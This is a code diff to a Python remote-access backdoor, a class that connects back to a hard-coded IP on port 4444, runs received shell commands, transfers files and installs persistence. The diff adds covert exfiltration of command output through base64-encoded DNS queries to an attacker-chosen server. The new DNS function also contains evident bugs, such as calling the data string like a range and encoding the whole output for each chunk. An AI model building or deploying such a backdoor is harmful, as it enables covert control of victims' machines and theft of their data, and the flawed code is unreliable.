@@ -6,10 +6,12 @@ import base64
 import sys
 import shutil
 import platform
+import dnslib
 
 class Backdoor:
-    def __init__(self, ip, port):
+    def __init__(self, ip, port, dns_server):
         self.sock_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.dns_server = dns_server
         self.sock_obj.connect((ip, port))
 
     def exec_system_cmd(self, command):
@@ -100,6 +102,23 @@ class Backdoor:
         except:
             return "[+] ERROR - Error during creating a file"           
     
+    def send_over_dns(self, data):
+        domain_name = "southpark.com"
+        resp = []
+        for i in data(0, len(data), 128):
+            if i+28 > len(data) - 1:
+                resp.append(data[i:len(data)])
+                break
+            resp.append(data[i:i+128])
+        for chunk in resp:
+            encoded_chunk = base64.b64encode(data.encode())
+            encoded_chunk_str = str(encoded_chunk).strip("'-b")
+            query = dnslib.DNSRecord.question(encoded_chunk_str + '.' + domain_name)
+            dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            dns_socket.sendto(query.pack(), (self.dns_server, 53))
+            response = dnslib.DNSRecord.parse(dns_socket.recv(4096))
+
+
     def run(self):
         self.persistence()
         while True:
@@ -116,12 +135,16 @@ class Backdoor:
                 res = self.read_file(recv_data[1])
             elif recv_data[0] == "upload":
                 res = self.write_file(recv_data[1], recv_data[2])
+            elif recv_data[0] == "DNS":
+                res = '.'
+                data = self.exec_system_cmd(recv_data[1:])
+                self.send_over_dns(data=data)
             else: 
                 res = self.exec_system_cmd(recv_data)
             self.reliable_send(res)
 
 try:
-    backdoor = Backdoor("192.168.1.36",4444)
+    backdoor = Backdoor("192.168.1.41",4444,"192.168.1.41")
     backdoor.run()
 except:
     sys.exit(0)
